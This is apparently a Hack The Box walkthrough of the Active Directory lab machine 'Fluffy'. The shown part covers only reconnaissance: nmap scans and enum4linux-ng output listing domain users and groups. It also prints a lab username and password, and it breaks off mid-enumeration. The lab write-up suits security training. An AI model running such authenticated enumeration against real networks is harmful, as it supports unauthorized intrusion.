just testing the page - do not worry
# HTB-Fluffy
*Walkthrough*

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/fluffy.jpg" />

---
## Intro
Don’t let the name fool you. Fluffy isn’t a walk in the park; it’s a masterclass in Active Directory exploitation. 
What starts as a simple misconfiguration in SMB guest access quickly spirals into a hunt for credentials. 
From exploiting a fresh PDF-based CVE to abusing the dark corners of Certificate Services (AD CS), this machine reminds us that even the 'softest' targets have teeth. 

Let’s dive into the belly of the beast.

---
## nmap
Let's start with a full nmap scan. Generally, especially for more complex machines that require more time, I open additional tabs in my terminal simultaneously to begin enumeration. A great tool that allows for an initial comprehensive enumeration is enum4linux-ng. Below are some of the results:

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
└──╼ [★]$ nmap -p- --min-rate 10000 10.129.232.88
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 09:31 CDT
Nmap scan report for 10.129.232.88
Host is up (0.0078s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  unknown
49722/tcp open  unknown
49744/tcp open  unknown

┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
└──╼ [★]$ nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985 -vv -sCV 10.129.232.88
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 09:33 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:33
Completed NSE at 09:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:33
Completed NSE at 09:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:33
Completed NSE at 09:33, 0.00s elapsed
Initiating Ping Scan at 09:33
Scanning 10.129.232.88 [4 ports]
Completed Ping Scan at 09:33, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:33
Completed Parallel DNS resolution of 1 host. at 09:33, 0.00s elapsed
Initiating SYN Stealth Scan at 09:33
Scanning 10.129.232.88 [11 ports]
Discovered open port 53/tcp on 10.129.232.88
Discovered open port 3269/tcp on 10.129.232.88
Discovered open port 593/tcp on 10.129.232.88
Discovered open port 445/tcp on 10.129.232.88
Discovered open port 88/tcp on 10.129.232.88
Discovered open port 139/tcp on 10.129.232.88
Discovered open port 389/tcp on 10.129.232.88
Discovered open port 5985/tcp on 10.129.232.88
Discovered open port 636/tcp on 10.129.232.88
Discovered open port 464/tcp on 10.129.232.88
Discovered open port 3268/tcp on 10.129.232.88
Completed SYN Stealth Scan at 09:33, 0.03s elapsed (11 total ports)
Initiating Service scan at 09:33
Scanning 11 services on 10.129.232.88
Completed Service scan at 09:34, 44.71s elapsed (11 services on 1 host)
NSE: Script scanning 10.129.232.88.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:34
NSE Timing: About 99.93% done; ETC: 09:34 (0:00:00 remaining)
Completed NSE at 09:34, 40.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 1.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
Nmap scan report for 10.129.232.88
Host is up, received echo-reply ttl 127 (0.0080s latency).
Scanned at 2026-05-04 09:33:28 CDT for 87s

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-04 21:33:34Z)
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-04T21:34:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-05-04T21:34:55+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-05-04T21:34:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-04T21:34:55+00:00; +7h00m00s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-04T21:34:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44288/tcp): CLEAN (Timeout)
|   Check 2 (port 50481/tcp): CLEAN (Timeout)
|   Check 3 (port 35164/udp): CLEAN (Timeout)
|   Check 4 (port 6279/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:34
Completed NSE at 09:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.57 seconds
           Raw packets sent: 15 (636B) | Rcvd: 12 (512B)


```

The scan confirms we're dealing with an AD environment and also reveals the domain name — `fluffy.htb` — which we had already suspected, and the DC name -  `dc01-fluffy.htb`.
We’ll go ahead and add it to our `/etc/hosts` file right away:

```bash
sudo nano /etc/hosts
```
Let's add:
```bash
10.10.11.69  fluffy.htb  dc01-fluffy.htb
```


As mentioned earlier, while Nmap was running, I started exploring other enumeration paths in parallel:

## Enum4linux-ng

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
└──╼ [★]$ enum4linux-ng -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.129.232.88
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.232.88
[*] Username ......... 'j.fleischman'
[*] Random Username .. 'azjbaudg'
[*] Password ......... 'J0elTHEM4n1990!'
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.232.88    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.232.88    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: fluffy.htb

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.232.88    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.232.88    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.232.88    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: FLUFFY
DNS domain: fluffy.htb
FQDN: DC01.fluffy.htb
Derived membership: domain member
Derived domain: FLUFFY

 ==========================================
|    RPC Session Check on 10.129.232.88    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'j.fleischman', password 'J0elTHEM4n1990!'
[*] Check for random user
[+] Server allows session using username 'azjbaudg', password 'J0elTHEM4n1990!'
[H] Rerunning enumeration with user 'azjbaudg' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.232.88    |
 ====================================================
[+] Domain: FLUFFY
[+] Domain SID: S-1-5-21-497550768-2797716248-2627064577
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.232.88    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Wk Sv PDC Tim NT

 ======================================
|    Users via RPC on 10.129.232.88    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 9 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 9 user(s) via 'enumdomusers'
[+] After merging user results we have 9 user(s) total:
'1103':
  username: ca_svc
  name: certificate authority service
  acb: '0x00000210'
  description: (null)
'1104':
  username: ldap_svc
  name: ldap service
  acb: '0x00000210'
  description: (null)
'1601':
  username: p.agila
  name: Prometheus Agila
  acb: '0x00000210'
  description: (null)
'1603':
  username: winrm_svc
  name: winrm service
  acb: '0x00000210'
  description: (null)
'1605':
  username: j.coffey
  name: John Coffey
  acb: '0x00000210'
  description: (null)
'1606':
  username: j.fleischman
  name: Joel Fleischman
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000214'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account

 =======================================
|    Groups via RPC on 10.129.232.88    |
 =======================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 17 group(s) via 'enumdomgroups'
[+] After merging groups results we have 50 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1604':
  groupname: Service Account Managers
  type: domain
'1607':
  groupname: Service Accounts
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
